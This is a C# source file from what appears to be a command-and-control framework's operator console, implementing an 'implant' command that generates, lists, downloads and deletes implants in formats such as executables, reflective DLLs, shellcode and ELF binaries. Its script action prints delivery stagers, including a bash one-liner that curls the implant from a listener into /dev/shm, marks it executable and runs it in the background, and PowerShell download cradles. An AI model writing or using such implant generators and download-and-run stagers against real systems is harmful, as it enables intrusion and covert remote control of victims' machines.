using System;
using System.Collections.Generic;
using System.CommandLine;
using System.CommandLine.Invocation;
using System.IO;
using System.Linq;
using System.Threading.Tasks;
using Commander.Executor;
using Commander.Helper;
using Commander.Models;
using Common;
using Common.Payload;
using Shared;
using Spectre.Console;

namespace Commander.Commands.Core
{
    public class ImplantCommandOptions
    {
        public string action { get; set; } // show, generate, download, delete
        public string name { get; set; } // for delete, download, script
        
        // Generation options
        public string listener { get; set; }
        public string endpoint { get; set; }
        public bool download { get; set; }
        public string type { get; set; } = "exe";
        public string arch { get; set; } = "x64";
    }

    public class ImplantCommand : EnhancedCommand<ImplantCommandOptions>
    {
        public override string Category => CommandCategory.Commander;
        public override string Description => "Manage Implants";
        public override string Name => "implant";
        public override ExecutorMode AvaliableIn => ExecutorMode.All;

        public override string[] Alternate => new string[] { "implants" };

        public override RootCommand Command
        {
            get
            {
                var root = new RootCommand(Description);
                root.AddArgument(new Argument<string>("action", () => "show", "Action to perform: show, generate, download, delete, script").FromAmong("show", "generate", "download", "delete", "script"));
                
                // Generated options
                root.AddOption(new Option<string>(new[] { "--listener", "-l" }, "Listener to connect to (for generate)"));
                root.AddOption(new Option<string>(new[] { "--endpoint", "-b" }, "Endpoint URL (for generate, e.g. http://10.10.10.10:80)"));
                root.AddOption(new Option<bool>(new[] { "--download", "-d" }, "Download implant after generation"));
                root.AddOption(new Option<string>(new[] { "--type", "-t" }, () => "exe", "exe | dll | rfl | svc | ps | bin | elf").FromAmong("exe", "dll", "rfl" , "svc", "ps", "bin", "elf"));
                root.AddOption(new Option<string>(new[] { "--arch", "-a" }, () => "x64", "x64 | x86").FromAmong("x64", "x86"));

                // Universal options
                root.AddOption(new Option<string>(new[] { "--name", "-n" }, "Implant Name (for delete, download, script)"));

                return root;
            }
        }

        protected override async Task<bool> HandleCommand(CommandContext<ImplantCommandOptions> context)
        {
            var action = context.Options.action?.ToLower() ?? "show";
            switch (action)
            {
                case "show":
                    return await this.ShowImplants(context);
                case "download":
                    return await this.DownloadImplant(context);
                case "generate":
                    return await this.GenerateImplant(context);
                case "delete":
                    return await this.DeleteImplant(context);
                case "script":
                    return await this.GenerateScript(context);
                default:
                    return await this.ShowImplants(context);
            }
        }

        private async Task<bool> ShowImplants(CommandContext<ImplantCommandOptions> context)
        {
            var implants = context.CommModule.GetImplants();
            if (implants == null || !implants.Any())
            {
                context.Terminal.WriteInfo("No implants found.");
                return true;
            }

            var table = new Spectre.Console.Table();
            table.AddColumn(new TableColumn("Name"));
            table.AddColumn(new TableColumn("Type"));
            table.AddColumn(new TableColumn("Arch"));
            table.AddColumn(new TableColumn("Endpoint"));
            table.AddColumn(new TableColumn("Listener"));

            foreach (var implant in implants)
            {
               var type = implant.Config?.Type.ToString() ?? "Unknown";
               var name = implant.Config?.ImplantName.ToString() ?? "Unknown";
               var arch = implant.Config?.Architecture.ToString() ?? "Unknown";
               var endpoint = implant.Config?.Endpoint?.ToString() ?? "Unknown";
               var listener = implant.Config?.Listener?.ToString() ?? "Custom";

               table.AddRow(name, type, arch, endpoint, listener);
            }

            context.Terminal.Write(table);
            return true;
        }

        private async Task<bool> GenerateImplant(CommandContext<ImplantCommandOptions> context)
        {
            var listenerName = context.Options.listener;
            var endpointStr = context.Options.endpoint;
            var typeStr = context.Options.type;
            var archStr = context.Options.arch;
            
            ConnexionUrl connexionUrl = null;

            if (!string.IsNullOrEmpty(listenerName))
            {
                var listener = context.CommModule.GetListeners().FirstOrDefault(l => l.Name.Equals(listenerName, StringComparison.OrdinalIgnoreCase));
                if (listener == null)
                {
                    context.Terminal.WriteError($"Listener '{listenerName}' not found.");
                    return false;
                }
                connexionUrl = ConnexionUrl.FromString(listener.EndPoint);
            }
            else if (!string.IsNullOrEmpty(endpointStr))
            {
                connexionUrl = ConnexionUrl.FromString(endpointStr);
                if (!connexionUrl.IsValid)
                {
                    context.Terminal.WriteError($"Invalid endpoint format: {endpointStr}. Expected format like tcp://host:port or http://host:port");
                    return false;
                }
            }
            else
            {
                context.Terminal.WriteError("Either listener or endpoint is required for generation.");
                return false;
            }


            var config = new ImplantConfig
            {
                 Endpoint = connexionUrl,
            };
            var type = ImplantType.Executable;
            switch (typeStr)
            {
                case "exe":
                    type = ImplantType.Executable; break ;
                case "dll":
                    type = ImplantType.Library; break;
                case "rfl":
                    type = ImplantType.ReflectiveLibrary; break;
                case "svc":
                    type = ImplantType.Service; break;
                case "ps":
                    type = ImplantType.PowerShell; break;
                case "bin":
                    type = ImplantType.Shellcode; break;
                case "elf":
                    type = ImplantType.Elf; break;
                default:
                    type = ImplantType.Executable; break;
            }

          
            config.Type = type;

            if (Enum.TryParse<ImplantArchitecture>(archStr, true, out var archEnum))
                config.Architecture = archEnum;
            else
                config.Architecture = ImplantArchitecture.x64;
            
            try
            {
                context.Terminal.WriteInfo($"Generating {config.Architecture} {config.Type} implant for {config.Endpoint}...");
                var result = await context.CommModule.GenerateImplant(config);
                
                if (context.Options.download && result != null && !string.IsNullOrEmpty(result.Id))
                {
                    // For a freshly generated implant, we use the name from the config
                    context.Options.name = result.ImplantName;
                    await this.DownloadImplant(context);
                }
            }
            catch (Exception ex)
            {
                context.Terminal.WriteError($"Generation failed: {ex.Message}");
            }
            return true;
        }

        private async Task<bool> DownloadImplant(CommandContext<ImplantCommandOptions> context)
        {
            var name = context.Options.name;
            if (string.IsNullOrEmpty(name))
            {
                context.Terminal.WriteError("Implant Name is required for download.");
                return false;
            }

            try
            {
                var implants = context.CommModule.GetImplants();
                var implantInfo = implants.FirstOrDefault(i => string.Equals(i.Config?.ImplantName, name, StringComparison.OrdinalIgnoreCase));

                if (implantInfo == null)
                {
                    context.Terminal.WriteError($"Implant with name '{name}' not found.");
                    return false;
                }

                context.Terminal.WriteInfo($"Downloading implant {name}...");
                var implant = await context.CommModule.GetImplantBinary(implantInfo.Id);
                
                if (string.IsNullOrEmpty(implant.Data))
                {
                    context.Terminal.WriteError("No data found for this implant.");
                    return false;
                }

                var data = Convert.FromBase64String(implant.Data);
                var fileName = PayloadGenerator.GetImplantFileName(implant.Config);


                var outPath = Path.Combine(Environment.CurrentDirectory, fileName);
                await File.WriteAllBytesAsync(outPath, data);
                context.Terminal.WriteSuccess($"Implant downloaded to {outPath}");
            }
            catch (Exception ex)
            {
                context.Terminal.WriteError($"Download failed: {ex.Message}");
            }
            return true;
        }


        private async Task<bool> DeleteImplant(CommandContext<ImplantCommandOptions> context)
        {
            var name = context.Options.name;
            if (string.IsNullOrEmpty(name))
            {
                context.Terminal.WriteError("Implant Name is required for deletion.");
                return false;
            }

            var implants = context.CommModule.GetImplants();
            var implantInfo = implants.FirstOrDefault(i => string.Equals(i.Config?.ImplantName, name, StringComparison.OrdinalIgnoreCase));

            if (implantInfo == null)
            {
                context.Terminal.WriteError($"Implant with name '{name}' not found.");
                return false;
            }

            await context.CommModule.DeleteImplant(implantInfo.Id);
            context.Terminal.WriteSuccess($"Implant {name} deleted.");
            return true;
        }

        private async Task<bool> GenerateScript(CommandContext<ImplantCommandOptions> context)
        {
             var name = context.Options.name;
             if (string.IsNullOrEmpty(name))
             {
                 context.Terminal.WriteError("Implant Name is required for script generation.");
                 return false;
             }

             var implants = context.CommModule.GetImplants();
             var selectedImplant = implants.FirstOrDefault(i => string.Equals(i.Config?.ImplantName, name, StringComparison.OrdinalIgnoreCase));

             if (selectedImplant == null)
             {
                 context.Terminal.WriteError($"Implant {name} not found.");
                 return false;
             }

             var listeners = context.CommModule.GetListeners();
             // Filter by listener if one is specified in the implant config
             if (!string.IsNullOrEmpty(selectedImplant.Config?.Listener))
             {
                 listeners = listeners.Where(l => l.Name == selectedImplant.Config.Listener).ToList();
             }
             else if(!string.IsNullOrEmpty(context.Options.listener))
             {
                 listeners = listeners.Where(l => l.Name == context.Options.listener).ToList();
             }

             if (!listeners.Any())
             {
                 context.Terminal.WriteInfo("No compatible listeners found.");
                 return true;
             }
            
            foreach (var listener in listeners)
            {
                var protocol = listener.Secured ? "https://" : "http://";
                var listenerUrl = $"{protocol}{listener.Ip}:{listener.BindPort}";
                var isSecured = listener.Secured;
                var implantUrl = $"{listenerUrl}/imp/{selectedImplant.Config?.ImplantName}{GetFileExtension(selectedImplant.Config?.Type ?? ImplantType.Executable)}";
                var fileName = $"{selectedImplant.Config?.ImplantName}{GetFileExtension(selectedImplant.Config?.Type ?? ImplantType.Executable)}";

                context.Terminal.WriteInfo($"Listener: {listener.Name} ({listenerUrl})");
                
                if (selectedImplant.Config?.Type == ImplantType.PowerShell)
                {
                    context.Terminal.Write("PowerShell Script (Clear):");
                    context.Terminal.Write(ScriptHelper.GeneratePowershellScript(implantUrl, isSecured));
                    context.Terminal.WriteLine();

                    context.Terminal.Write("PowerShell Script (Base64):");
                    context.Terminal.Write(ScriptHelper.GeneratePowershellScriptB64(implantUrl, isSecured));
                    context.Terminal.WriteLine();
                }
                else if (selectedImplant.Config?.Type == ImplantType.Elf)
                {
                    var bashScript = $"curl -s -o /dev/shm/{selectedImplant.Config.ImplantName} {implantUrl} && chmod +x /dev/shm/{selectedImplant.Config.ImplantName} && /dev/shm/{selectedImplant.Config.ImplantName} &";
                    context.Terminal.Write("Bash Oneliner:");
                    context.Terminal.Write(bashScript);
                    context.Terminal.WriteLine();
                }
                else
                {
                    context.Terminal.Write("PowerShell Download Script:");
                    context.Terminal.Write(ScriptHelper.GeneratePowershellDownloadScript(implantUrl, fileName, isSecured));
                    context.Terminal.WriteLine();
                }
                
                context.Terminal.Write(new Rule());
            }

            return true;
        }

        private string GetFileExtension(ImplantType type)
        {
            switch (type)
            {
                case ImplantType.Executable:
                case ImplantType.Service:
                    return ".exe";
                case ImplantType.PowerShell:
                    return ".ps1";
                case ImplantType.Elf:
                    return ""; 
                case ImplantType.Library:
                case ImplantType.ReflectiveLibrary:
                    return ".dll";
                default:
                    return ".bin";
            }
        }
    }
}
